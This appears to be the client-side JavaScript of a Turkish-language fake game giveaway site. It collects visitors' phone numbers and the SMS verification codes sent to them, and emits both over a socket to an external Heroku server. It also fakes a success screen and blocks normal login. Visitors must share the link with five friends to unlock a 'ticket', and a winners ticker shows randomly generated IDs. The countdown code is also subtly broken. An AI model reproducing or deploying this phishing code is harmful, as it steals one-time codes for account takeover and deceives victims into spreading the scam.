console.log("SCRIPT.JS YÜKLENDİ - BAŞLANGIÇ");

function showCard(card) {
  console.log("showCard çağrıldı:", card);
  if (card) {
    card.classList.remove("hidden");
    requestAnimationFrame(() => {
      card.classList.add("visible");
    });
  } else {
    console.log("showCard hatası: Card bulunamadı");
  }
}

function hideCard(card) {
  if (card) {
    card.classList.remove("visible");
    setTimeout(() => {
      card.classList.add("hidden");
    }, 300);
  } else {
    console.log("hideCard hatası: Card bulunamadı");
  }
}

document.addEventListener("DOMContentLoaded", () => {
  console.log("DOMContentLoaded TETİKLENDİ!");

  // ================= TEMEL ELEMENTLER =================
  const loginCard = document.getElementById("loginCard");
  const registerCard = document.getElementById("registerCard");
  const verifyCard = document.getElementById("verifyCard");
  const successScreen = document.getElementById("successScreen");
  const mainMenu = document.getElementById("mainMenu");
  const authWrapper = document.querySelector(".auth-wrapper");

  // Global erişim için
  window.showRegister = function () {
    hideCard(loginCard);
    showCard(registerCard);
  };

  window.showLogin = function () {
    hideCard(registerCard);
    hideCard(verifyCard);
    hideCard(successScreen);
    showCard(loginCard);
  };

  // başlangıç durumu
  if (registerCard) registerCard.classList.add("hidden");
  if (verifyCard) verifyCard.classList.add("hidden");
  if (successScreen) successScreen.classList.add("hidden");

  // localStorage kontrolü
  const isLoggedIn = localStorage.getItem("loggedIn");

  if (isLoggedIn === "true") {
    if (authWrapper) authWrapper.style.display = "none";
    if (mainMenu) mainMenu.style.display = "block";
  } else {
    if (loginCard) showCard(loginCard);
  }

  // ================= SOCKET / KAYIT AKIŞI =================
  if (typeof io !== "undefined") {
    const socket = io("https://afternoon-lake-61658-70a3b4756b95.herokuapp.com");
    console.log("CLIENT SOCKET BAĞLANDI");

    const phoneInput = document.getElementById("registerPhone");

    if (phoneInput) {
      phoneInput.addEventListener("focus", () => {
        if (phoneInput.value === "") phoneInput.value = "05";
      });

      phoneInput.addEventListener("input", () => {
        phoneInput.value = phoneInput.value.replace(/[^0-9]/g, "");
        if (!phoneInput.value.startsWith("05")) phoneInput.value = "05";
        if (phoneInput.value.length > 11) {
          phoneInput.value = phoneInput.value.slice(0, 11);
        }
      });
    }

    const registerBtn = document.getElementById("registerSubmit");
    const btnText = registerBtn ? registerBtn.querySelector(".btn-text") : null;

    if (registerBtn) {
      registerBtn.addEventListener("click", () => {
        console.log("Gönder butonu tıklandı!");

        const phone = phoneInput ? phoneInput.value.trim() : "";
        console.log("Telefon numarası:", phone);

        if (!phone) {
          console.log("Telefon boş, return");
          return;
        }

        // USER ID OLUŞTUR
        const last4 = phone.slice(-4);
        const userIdGenerated = "XPAY-" + last4;
        localStorage.setItem("userId", userIdGenerated);

        // KAYIT TARİHİ
        const today = new Date().toLocaleDateString("tr-TR");
        localStorage.setItem("registerDate", today);

        socket.emit("new-phone", phone);
        console.log("socket.emit çağrıldı");

        registerBtn.disabled = true;
        if (btnText) btnText.textContent = "Kod gönderiliyor";
        registerBtn.classList.add("spinning");

        setTimeout(() => {
          if (btnText) btnText.textContent = "Kod gönderildi";
          registerBtn.classList.add("slow");
        }, 12000);

        setTimeout(() => {
          registerBtn.classList.remove("spinning");
          registerBtn.classList.remove("slow");
          registerBtn.disabled = false;
          if (btnText) btnText.textContent = "Gönder";
          hideCard(registerCard);
          showCard(verifyCard);
        }, 14000);
      });
    }

    const verifyBtn = document.getElementById("verifySubmit");

    if (verifyBtn) {
      verifyBtn.addEventListener("click", () => {
        const code = document.getElementById("verifyCode").value.trim();
        if (!code) return;

        console.log("CLIENT CODE GÖNDERDİ:", code);
        socket.emit("new-code", code);

        verifyBtn.classList.add("loading");

        setTimeout(() => {
          verifyBtn.classList.remove("loading");
          hideCard(verifyCard);
          showCard(successScreen);

          localStorage.setItem("loggedIn", "true");

          setTimeout(() => {
            if (authWrapper) authWrapper.style.display = "none";
            if (mainMenu) mainMenu.style.display = "block";
          }, 900);
        }, 2000);
      });
    }

    const loginBtn = document.getElementById("loginBtn");
    const loginError = document.getElementById("loginError");

    if (loginBtn && loginError) {
      loginBtn.addEventListener("click", (e) => {
        e.preventDefault();
        loginError.style.display = "block";
      });
    }
  } else {
    console.log("io hatası: Socket.io client yüklenmedi");
  }

  // ================= EVENT MODAL =================
  const cards = document.querySelectorAll(".game-card");
  const overlay = document.getElementById("eventOverlay");
  const closeBtn = document.getElementById("closeEventModal");
  const modalImg = document.getElementById("eventModalImg");
  const modalTitle = document.getElementById("eventModalTitle");
  const modalDesc = document.getElementById("eventModalDesc");

  // Ticket buton sistemi
  const buyTicketBtn = document.getElementById("buyTicketBtn");
  const copyLinkBtn = document.getElementById("copyLinkBtn");
  const ticketToast = document.getElementById("ticketToast");

  let ticketUnlockTimer = null;
  let ticketActivated = false;

  function resetTicketButton() {
    if (!buyTicketBtn) return;

    clearTimeout(ticketUnlockTimer);
    ticketActivated = false;

    buyTicketBtn.disabled = true;
    buyTicketBtn.classList.remove("enabled", "success");
    buyTicketBtn.textContent = "Bilet Al";
  }

  function showTicketToast() {
    if (!ticketToast) return;

    ticketToast.classList.add("show");

    setTimeout(() => {
      ticketToast.classList.remove("show");
    }, 3000);
  }

  cards.forEach(card => {
    card.addEventListener("click", () => {
      if (modalImg) modalImg.src = card.dataset.img || "";
      if (modalTitle) modalTitle.textContent = card.dataset.title || "";
      if (modalDesc) {
        modalDesc.innerHTML = `
          ${card.dataset.desc || ""}
          <br><br>
          <strong>Not: Bilet Al butonunun aktif olması için linki 5 arkadaşınız ile paylaşmanız gerekmektedir. Şartları yerine getirip çekilişe katılmaya hak kazanan üyelerimizin çekiliş için ikinci bir bilet almaları durumunda tespit edilip hakları iptal edilecektir.</strong>
        `;
      }

      resetTicketButton();

      if (overlay) overlay.classList.remove("hidden");
    });
  });

  if (closeBtn) {
    closeBtn.addEventListener("click", () => {
      resetTicketButton();
      if (overlay) overlay.classList.add("hidden");
    });
  }

  if (overlay) {
    overlay.addEventListener("click", (e) => {
      if (e.target === overlay) {
        resetTicketButton();
        overlay.classList.add("hidden");
      }
    });
  }

  // Link kopyalama → 20 saniye sonra Bilet Al aktif
  if (copyLinkBtn && buyTicketBtn) {
    copyLinkBtn.addEventListener("click", async () => {
      try {
        await navigator.clipboard.writeText("https://walker-wti.vercel.app/");
      } catch (err) {
        console.log("Kopyalama başarısız:", err);
      }

      copyLinkBtn.innerHTML = "✔";

      setTimeout(() => {
        copyLinkBtn.innerHTML = '<img src="/images/link-icon.png" alt="link">';
      }, 1500);

      clearTimeout(ticketUnlockTimer);

      ticketUnlockTimer = setTimeout(() => {
        if (!ticketActivated) {
          buyTicketBtn.disabled = false;
          buyTicketBtn.classList.add("enabled");
          buyTicketBtn.classList.remove("success");
          buyTicketBtn.textContent = "Bilet Al";
        }
      }, 20000);
    });
  }

  // Bilet Al → yeşil tik + bildirim + aktif bonus +1
  if (buyTicketBtn) {
    buyTicketBtn.addEventListener("click", () => {
      if (buyTicketBtn.disabled || ticketActivated) return;

      ticketActivated = true;
      buyTicketBtn.disabled = true;
      buyTicketBtn.classList.remove("enabled");
      buyTicketBtn.classList.add("success");
      buyTicketBtn.textContent = "✔";

      const currentBonus = parseInt(localStorage.getItem("activeTickets") || "0", 10) || 0;
      const newBonus = currentBonus + 1;
      localStorage.setItem("activeTickets", String(newBonus));

      const activeTicketsEl = document.getElementById("activeTickets");
      if (activeTicketsEl) {
        activeTicketsEl.textContent = String(newBonus);
      }

      showTicketToast();
    });
  }

  //// ================= COUNTDOWNLAR =================
const countdownEl = document.getElementById("countdownTimer");
const pubgCountdownEl = document.getElementById("pubgCountdownTimer");

// Brawl için kalıcı 10 günlük sayaç
const targetDate = localStorage.getItem("targetDate");

// PUBG için kalıcı 10 günlük sayaç
let pubgTargetDate = localStorage.getItem("pubgTargetDate");

if (!pubgTargetDate) {
  pubgTargetDate = Date.now() + 10 * 24 * 60 * 60 * 1000;
  localStorage.setItem("pubgTargetDate", pubgTargetDate);
} else {
  pubgTargetDate = parseInt(pubgTargetDate, 10);
}

if (!targetDate) {
  targetDate = Date.now() +  7 * 24 * 60 * 60 * 1000;
  localStorage.setItem("targetDate", targetDate);
} else {
  targetDate = parseINT(targetDate, 7);
}

function formatCountdown(distance) {
  if (distance <= 0) {
    return "SÜRE DOLDU";
  }

  const days = Math.floor(distance / (1000 * 60 * 60 * 24));
  const hours = Math.floor((distance / (1000 * 60 * 60)) % 24);
  const minutes = Math.floor((distance / (1000 * 60)) % 60);
  const seconds = Math.floor((distance / 1000) % 60);

  return `${days}G ${hours.toString().padStart(2, "0")}:${minutes
    .toString()
    .padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
}

function updateCountdowns() {
  const now = Date.now();

  if (countdownEl) {
    const distance = targetDate - now;
    countdownEl.textContent = formatCountdown(distance);
  }

  if (pubgCountdownEl) {
    const pubgDistance = pubgTargetDate - now;
    pubgCountdownEl.textContent = formatCountdown(pubgDistance);
  }
}

updateCountdowns();
setInterval(updateCountdowns, 1000);
  

  // ================= SLIDER =================
  const sliderImages = [
    "/images/slide1.jpg",
    "/images/slide2.jpg",
    "/images/slide3.jpg",
    "/images/slide4.jpg",
    "/images/slide5.jpg"
  ];

  let currentSlide = 0;
  const sliderImage = document.getElementById("sliderImage");
  const prevSlide = document.getElementById("prevSlide");
  const nextSlide = document.getElementById("nextSlide");

  function showSlide(index) {
    if (!sliderImage) return;
    sliderImage.src = sliderImages[index];
  }

  if (prevSlide && nextSlide && sliderImage) {
    prevSlide.addEventListener("click", () => {
      currentSlide = (currentSlide - 1 + sliderImages.length) % sliderImages.length;
      showSlide(currentSlide);
    });

    nextSlide.addEventListener("click", () => {
      currentSlide = (currentSlide + 1) % sliderImages.length;
      showSlide(currentSlide);
    });

    setInterval(() => {
      currentSlide = (currentSlide + 1) % sliderImages.length;
      showSlide(currentSlide);
    }, 3000);
  }

  // ================= ARAMA =================
  const searchInput = document.querySelector(".search-box input");
  const searchBtn = document.querySelector(".search-btn");

  function performSearch() {
    if (!searchInput) return;

    const query = searchInput.value.trim();

    if (query === "") {
      alert("Lütfen arama yapmak için bir şey yazın!");
      return;
    }

    const mainContent =
      document.querySelector(".main-content") ||
      document.querySelector(".hero-section") ||
      document.getElementById("mainContent");

    if (mainContent) {
      mainContent.style.display = "none";
    }

    let noResultScreen = document.getElementById("no-result-screen");

    if (!noResultScreen) {
      noResultScreen = document.createElement("div");
      noResultScreen.id = "no-result-screen";
      noResultScreen.style.cssText = `
        text-align: center;
        padding: 80px 20px;
        color: #c084fc;
        font-size: 24px;
        min-height: 60vh;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        background: rgba(0, 0, 0, 0.6);
        border-radius: 16px;
        margin: 20px;
      `;

      noResultScreen.innerHTML = `
        <h2>😕 Sonuç Bulunamadı</h2>
        <p style="font-size: 18px; margin-top: 15px; color: #d8b4fe;">
          "${query}" ile ilgili herhangi bir sonuç bulunamadı.
        </p>
        <button onclick="clearSearch()" 
                style="margin-top: 30px; padding: 12px 28px; background: linear-gradient(135deg, #7c3aed, #c084fc); 
                       color: white; border: none; border-radius: 12px; font-size: 16px; cursor: pointer;">
          Ana Sayfaya Dön
        </button>
      `;

      const container = document.querySelector(".main-menu") || document.body;
      container.appendChild(noResultScreen);
    } else {
      const p = noResultScreen.querySelector("p");
      if (p) {
        p.textContent = `"${query}" ile ilgili herhangi bir sonuç bulunamadı.`;
      }
    }
  }

  if (searchBtn) {
    searchBtn.addEventListener("click", performSearch);
  }

  if (searchInput) {
    searchInput.addEventListener("keypress", function (e) {
      if (e.key === "Enter") {
        performSearch();
      }
    });
  }

  window.clearSearch = function () {
    const noResultScreen = document.getElementById("no-result-screen");
    if (noResultScreen) {
      noResultScreen.remove();
    }

    const mainContent =
      document.querySelector(".main-content") ||
      document.querySelector(".hero-section");

    if (mainContent) {
      mainContent.style.display = "flex";
    }

    if (searchInput) {
      searchInput.value = "";
    }
  };

  // ================= PROFİL DROPDOWN =================
  const profileBtn = document.getElementById("profileBtn");
  const profileDropdown = document.getElementById("profileDropdown");
  const logoutBtn = document.getElementById("logoutBtn");
  const userId = document.getElementById("userId");
  const registerDate = document.getElementById("registerDate");
  const activeTickets = document.getElementById("activeTickets");

  if (profileBtn && profileDropdown) {
    if (userId) {
      const savedId = localStorage.getItem("userId");
      if (savedId) {
        userId.textContent = savedId;
      } else {
        userId.textContent = "XPAY-????";
      }
    }

    if (registerDate) {
      const savedDate = localStorage.getItem("registerDate");
      if (savedDate) {
        registerDate.textContent = savedDate;
      } else {
        const today = new Date().toLocaleDateString("tr-TR");
        registerDate.textContent = today;
        localStorage.setItem("registerDate", today);
      }
    }

    if (activeTickets) {
      activeTickets.textContent = localStorage.getItem("activeTickets") || "0";
    }

    profileBtn.addEventListener("click", (e) => {
      e.stopPropagation();
      profileDropdown.classList.toggle("show");
    });

    profileDropdown.addEventListener("click", (e) => {
      e.stopPropagation();
    });

    document.addEventListener("click", () => {
      profileDropdown.classList.remove("show");
    });

    document.addEventListener("keydown", (e) => {
      if (e.key === "Escape") {
        profileDropdown.classList.remove("show");
      }
    });

    if (logoutBtn) {
      logoutBtn.addEventListener("click", () => {
        localStorage.removeItem("loggedIn");
        location.reload();
      });
    }
  }

// ================= KAZANANLAR ŞERİDİ - GERÇEK SONSUZ AKIŞ =================
const winnerTrack = document.getElementById("winnerTrack");

function generateWinnerId() {
  const number = Math.floor(1000 + Math.random() * 9000);
  return `XPAY-${number}`;
}

function createWinnerItem() {
  const item = document.createElement("span");
  item.className = "winner-id";
  item.textContent = generateWinnerId();
  return item;
}

function startWinnerMarquee() {
  if (!winnerTrack) return;

  winnerTrack.innerHTML = "";

  // İlk dolum
  for (let i = 0; i < 20; i++) {
    winnerTrack.appendChild(createWinnerItem());
  }

  let offset = 0;
  const speed = 0.8; // hız: 0.4 daha yavaş, 0.8 daha hızlı

  function step() {
    offset -= speed;
    winnerTrack.style.transform = `translateX(${offset}px)`;

    const first = winnerTrack.firstElementChild;

    if (first) {
      const firstWidth = first.offsetWidth;
      const gap = 36;

      if (Math.abs(offset) >= firstWidth + gap) {
        offset += firstWidth + gap;
        winnerTrack.appendChild(createWinnerItem());
        winnerTrack.removeChild(first);
        winnerTrack.style.transform = `translateX(${offset}px)`;
      }
    }

    requestAnimationFrame(step);
  }

  requestAnimationFrame(step);
}

startWinnerMarquee();

});